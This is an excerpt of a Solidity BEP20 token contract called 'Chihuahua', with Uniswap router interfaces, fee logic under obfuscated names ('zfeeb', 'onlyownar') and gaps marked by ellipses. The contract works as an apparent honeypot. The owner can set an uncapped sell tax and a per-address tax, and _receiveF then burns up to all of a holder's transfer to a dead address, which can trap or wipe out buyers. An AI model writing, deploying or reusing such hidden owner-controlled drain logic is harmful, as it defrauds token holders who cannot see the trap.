...
interface IUniswapV2Factory {
    ...
    function zfeebTo() external view returns (address);
    function zfeebToSetter() external view returns (address);
    ...
    function setzfeebTo(address) external;
    function setzfeebToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingzfeebOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingzfeebOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingzfeebOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingzfeebOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingzfeebOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Chihuahua is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellzfeeb = 0;

    uint256 private _defaultBuyzfeeb = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipzfeeb;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellzfeeb = _value;
    }

    function setSlipzfeeb(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipzfeeb[_address] = _value;
    }

    function getSlipzfeeb(address _address) external view onlyownar returns (uint256) {
        return _slipzfeeb[_address];
    }


    function setMAccountzfeeb(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountzfeeb(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradezfeebAmount = 0;

        if (rF) {
            uint256 tradezfeeb = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradezfeeb = _defaultSellzfeeb;
                }
                if (from == uniswapV2Pair) {

                    tradezfeeb = _defaultBuyzfeeb;
                }
            }
            if (_slipzfeeb[from] > 0) {
                tradezfeeb = _slipzfeeb[from];
            }

            tradezfeebAmount = _Amount.mul(tradezfeeb).div(100);
        }


        if (tradezfeebAmount > 0) {
            _balances[from] = _balances[from].sub(tradezfeebAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradezfeebAmount);
            emit Transfer(from, _deadAddress, tradezfeebAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradezfeebAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradezfeebAmount);
        emit Transfer(from, _to, _Amount - tradezfeebAmount);
    }
